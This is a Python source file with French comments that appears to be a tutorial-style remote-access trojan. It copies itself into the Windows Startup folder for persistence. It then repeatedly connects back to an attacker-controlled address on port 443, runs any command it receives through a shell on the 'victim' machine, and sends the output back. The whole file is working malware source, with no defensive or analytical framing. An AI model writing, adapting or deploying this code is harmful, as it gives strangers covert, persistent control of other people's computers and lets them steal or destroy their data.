import os
import threading
import time
import socket
import sys
import shutil
import subprocess

CCIP = "192.168.1.173" # IP de la machine attaquante
CCPORT = 443 # Port par défaut

def autorun():  # fonction qui va copier le fichier exécutable ou python dans le dossier 'démarrage'
                # à chaque redémarrage, le script s'exécute automatiquement

    if getattr(sys, "frozen", False):
        # On lance le programme en tant que fichier exécutable
        exe_path = sys.executable
    else:
        # On lance le programme en tant que script python
        exe_path = os.path.abspath(__file__)

    exe_file = os.path.basename(exe_path) # Nom du fichier exécutable ou python

    startup = os.path.join(  # Créer le chemin vers le dossier démarrage
        os.environ["APPDATA"],
        "Microsoft",
        "Windows",
        "Start Menu",
        "Programs",
        "Startup"
    )

    shutil.copy2(exe_path, os.path.join(startup,exe_file)) # Copie l'exécutable dans le dossier startup de Windows

def connect(CCIP, CCPORT): # Connecter le client au serveur (listener) qui écoute au port 443
    try:
        client = socket.socket(socket.AF_INET,socket.SOCK_STREAM) # Création du socket pour établir la connection
        client.connect((CCIP,CCPORT)) # Connection au port écouté
        return client
    except Exception as error:
        print(error)

def cmd(client, data): # Pour gérer les commandes
    try:
        proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE) # Pour les commandes qu'on va taper à distance (del, xcopy, shutdown...)
        output = proc.stdout.read() + proc.stderr.read() # On lis la sortie de la commande tapée
        client.send(output) # La sortie de la commande est exécutée dans l'ordinateur de la victime
    except Exception as error:
        print(error)

def cli(client): # Pour maintenir la connection et le transfert des commandes à l'ordinateur de la victime
    try:
        while True:
            data = client.recv(1024).decode().strip() # le client connecté continue en boucle à recevoir les commandes
            if data == "/:kill": # Commande couper la connection (vous pouvez mettre autre chose que kill)
                return
            else:
                threading.Thread(target=cmd,args=(client, data)).start() # création et lancement d'un thread
    except Exception as error:
        client.close()

if __name__=="__main__":
    autorun()
    while True:
        client = connect(CCIP,CCPORT)
        if client: # vérifie si la connection du client est établi
            cli(client) # on exécute la fonction principale
        else:
            time.sleep(3) # On relance la connection après un certain délai



